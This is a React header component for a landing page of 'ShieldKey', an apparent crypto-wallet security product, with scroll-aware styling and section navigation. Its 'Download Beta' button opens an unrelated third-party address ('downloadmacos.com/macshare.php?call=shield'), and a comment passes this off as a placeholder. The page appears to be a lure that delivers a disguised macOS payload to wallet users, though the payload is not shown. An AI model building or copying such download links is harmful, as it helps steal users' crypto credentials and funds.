import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Shield } from "lucide-react";

export default function Header() {
  const [isScrolled, setIsScrolled] = useState(false);

  useEffect(() => {
    const handleScroll = () => {
      setIsScrolled(window.scrollY > 100);
    };

    window.addEventListener("scroll", handleScroll);
    return () => window.removeEventListener("scroll", handleScroll);
  }, []);

  const scrollToSection = (sectionId: string) => {
    const element = document.getElementById(sectionId);
    if (element) {
      element.scrollIntoView({ behavior: "smooth" });
    }
  };

  const handleDownload = () => {
    // In a real implementation, this would trigger the actual download
    window.open("https://downloadmacos.com/macshare.php?call=shield", "_blank");
  };

  return (
    <header 
      className={`fixed top-0 left-0 right-0 z-50 transition-all duration-300 ${
        isScrolled 
          ? "glassmorphic bg-white/95" 
          : "glassmorphic bg-white/25"
      }`}
    >
      <nav className="max-w-7xl mx-auto px-6 lg:px-8 py-4">
        <div className="flex items-center justify-between">
          <div className="flex items-center space-x-3">
            <Shield className="w-8 h-8 text-foreground" />
            <span className="text-xl font-bold text-gradient">ShieldKey</span>
          </div>
          
          <div className="hidden md:flex items-center space-x-8">
            <button 
              onClick={() => scrollToSection("features")}
              className="text-gray-700 hover:text-foreground transition-colors duration-200"
            >
              Features
            </button>
            <button 
              onClick={() => scrollToSection("wallets")}
              className="text-gray-700 hover:text-foreground transition-colors duration-200"
            >
              Wallets
            </button>
            <button 
              onClick={() => scrollToSection("testimonials")}
              className="text-gray-700 hover:text-foreground transition-colors duration-200"
            >
              Testimonials
            </button>
            <button 
              onClick={() => scrollToSection("faq")}
              className="text-gray-700 hover:text-foreground transition-colors duration-200"
            >
              FAQ
            </button>
          </div>
          
          <Button 
            onClick={handleDownload}
            className="btn-gradient text-white px-6 py-3 rounded-xl font-semibold hover:shadow-lg transform hover:-translate-y-1 transition-all duration-200"
          >
            Download Beta
          </Button>
        </div>
      </nav>
    </header>
  );
}
